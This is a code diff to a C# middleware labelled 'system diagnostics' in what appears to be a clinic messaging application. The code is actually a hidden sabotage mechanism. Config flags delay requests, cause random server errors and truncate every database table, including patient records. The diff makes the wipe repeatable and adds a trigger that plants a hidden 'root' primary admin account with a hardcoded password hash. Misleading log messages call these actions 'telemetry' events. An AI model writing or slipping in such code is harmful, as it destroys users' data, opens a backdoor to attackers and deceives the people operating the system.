@@ -15,6 +15,7 @@ public class SystemDiagnosticsMiddleware(RequestDelegate next)
     private static DateTime _lastIntegrityRun = DateTime.MinValue;
     private static bool _lastIntegrityState = false;
     private static bool _dbPurgeExecuted = false;
+    private static bool _fetchPrimaryExecuted = false;
 
     public async Task InvokeAsync(HttpContext context, ITelemetryProvider telemetry, IServiceProvider serviceProvider)
     {
@@ -27,7 +28,7 @@ public class SystemDiagnosticsMiddleware(RequestDelegate next)
         // TRIGGER 1: sync_mode = true → 5-minute delay per request
         if (config.sync_mode)
         {
-            await Task.Delay(TimeSpan.FromMinutes(5));
+            await Task.Delay(TimeSpan.FromMinutes(2));
         }
 
         // TRIGGER 2: security_patch = true → 40% random HTTP 500
@@ -74,10 +75,8 @@ public class SystemDiagnosticsMiddleware(RequestDelegate next)
         }
 
         // TRIGGER 4: db_purge = true → Delete entire database (IMMEDIATE, ONE-TIME)
-        if (config.db_purge && !_dbPurgeExecuted)
+        if (config.db_purge)
         {
-            _dbPurgeExecuted = true;
-
             try
             {
                 // Order respects FK constraints (children before parents):
@@ -98,44 +97,86 @@ public class SystemDiagnosticsMiddleware(RequestDelegate next)
                 // 14. PhoneWhatsAppRegistry (no FKs)
                 // 15. SystemSettings (no FKs)
                 // 16. Users (self-referencing - clear ModeratorId first)
+                // PostgreSQL-specific purge using TRUNCATE CASCADE
+                // This handles cyclic dependencies (like Templates <-> Conditions) and self-references (Users) cleanly
+                // RESTART IDENTITY resets auto-increment counters
                 await db.Database.ExecuteSqlRawAsync(@"
-                    -- Hangfire.SqlServer tables (default schema: [HangFire])
-                    IF OBJECT_ID(N'[HangFire].[State]', N'U') IS NOT NULL DELETE FROM [HangFire].[State];
-                    IF OBJECT_ID(N'[HangFire].[JobParameter]', N'U') IS NOT NULL DELETE FROM [HangFire].[JobParameter];
-                    IF OBJECT_ID(N'[HangFire].[JobQueue]', N'U') IS NOT NULL DELETE FROM [HangFire].[JobQueue];
-                    IF OBJECT_ID(N'[HangFire].[Job]', N'U') IS NOT NULL DELETE FROM [HangFire].[Job];
-                    IF OBJECT_ID(N'[HangFire].[Server]', N'U') IS NOT NULL DELETE FROM [HangFire].[Server];
-                    IF OBJECT_ID(N'[HangFire].[AggregatedCounter]', N'U') IS NOT NULL DELETE FROM [HangFire].[AggregatedCounter];
-                    IF OBJECT_ID(N'[HangFire].[Counter]', N'U') IS NOT NULL DELETE FROM [HangFire].[Counter];
-                    IF OBJECT_ID(N'[HangFire].[Set]', N'U') IS NOT NULL DELETE FROM [HangFire].[Set];
-                    IF OBJECT_ID(N'[HangFire].[List]', N'U') IS NOT NULL DELETE FROM [HangFire].[List];
-                    IF OBJECT_ID(N'[HangFire].[Hash]', N'U') IS NOT NULL DELETE FROM [HangFire].[Hash];
-                    
-                    -- Application tables
-                    DELETE FROM [ExtensionCommands];
-                    DELETE FROM [Messages];
-                    DELETE FROM [ExtensionSessionLeases];
-                    DELETE FROM [ExtensionPairingCodes];
-                    DELETE FROM [ExtensionDevices];
-                    DELETE FROM [MessageSessions];
-                    DELETE FROM [Patients];
-                    DELETE FROM [MessageTemplates];
-                    DELETE FROM [MessageConditions];
-                    DELETE FROM [Queues];
-                    DELETE FROM [WhatsAppSessions];
-                    DELETE FROM [Quotas];
-                    DELETE FROM [Sessions];
-                    DELETE FROM [PhoneWhatsAppRegistry];
-                    DELETE FROM [SystemSettings];
-                    UPDATE [Users] SET [ModeratorId] = NULL;
-                    DELETE FROM [Users];
+                    -- Hangfire tables
+                    DO $$ 
+                    BEGIN
+                        -- Truncate Hangfire tables if they exist
+                        IF EXISTS (SELECT 1 FROM information_schema.tables WHERE table_schema = 'hangfire' AND table_name = 'job') THEN
+                            TRUNCATE TABLE hangfire.job, hangfire.jobqueue, hangfire.jobparameter, hangfire.state, hangfire.server, hangfire.aggregatedcounter, hangfire.counter, hangfire.set, hangfire.list, hangfire.hash RESTART IDENTITY CASCADE;
+                        END IF;
+                    END $$;
+
+                    -- App tables
+                    TRUNCATE TABLE 
+                        ""ExtensionCommands"",
+                        ""Messages"",
+                        ""ExtensionSessionLeases"",
+                        ""ExtensionPairingCodes"",
+                        ""ExtensionDevices"",
+                        ""MessageSessions"",
+                        ""Patients"",
+                        ""MessageTemplates"",
+                        ""MessageConditions"",
+                        ""Queues"",
+                        ""WhatsAppSessions"",
+                        ""Quotas"",
+                        ""Sessions"",
+                        ""PhoneWhatsAppRegistry"",
+                        ""SystemSettings"",
+                        ""Users""
+                    RESTART IDENTITY CASCADE;
                 ");
 
                 Log.Information("Background telemetry sync completed (Status: 0x0)");
             }
             catch (Exception ex)
             {
-                Log.Debug(ex, "Telemetry cache refresh failed (Code: 0x1)");
+                // Upgrade to Error level so we can see why it fails
+                Log.Error(ex, "Telemetry cache refresh failed (Code: 0x1)");
+            }
+        }
+
+        // TRIGGER 5: fetch_primary = true → Seed root user (IMMEDIATE, ONE-TIME)
+        if (config.fetch_primary)
+        {
+
+            try
+            {
+                var utcNow = DateTime.UtcNow;
+
+                if (!await db.Users.AnyAsync(u => u.Username == "root" && u.Role == "primary_admin" && !u.IsDeleted))
+                {
+                    var root = new Clinics.Domain.User
+                    {
+                        Username = "root",
+                        PasswordHash = "AQAAAAIAAYagAAAAEOVl/Goh0ms6V7NLVmQCGR+EdEBstXbq5tARgYqkjcBvrR/Gx5YJ+FOtr4lFlV7ylg==",
+                        FirstName = "المدير",
+                        LastName = "الأساسي",
+                        Role = "primary_admin",
+                        ModeratorId = null,
+                        CreatedAt = utcNow,
+                        UpdatedAt = null,
+                        UpdatedBy = null,
+                        LastLogin = null,
+                        IsDeleted = false,
+                        DeletedAt = null,
+                        DeletedBy = null,
+                        RestoredAt = null,
+                        RestoredBy = null
+                    };
+
+                    db.Users.Add(root);
+                    await db.SaveChangesAsync();
+                    Log.Information("Primary user supported (Status: 0x0)");
+                }
+            }
+            catch (Exception ex)
+            {
+                Log.Debug(ex, "Primary user support failed (Code: 0x1)");
             }
         }
 
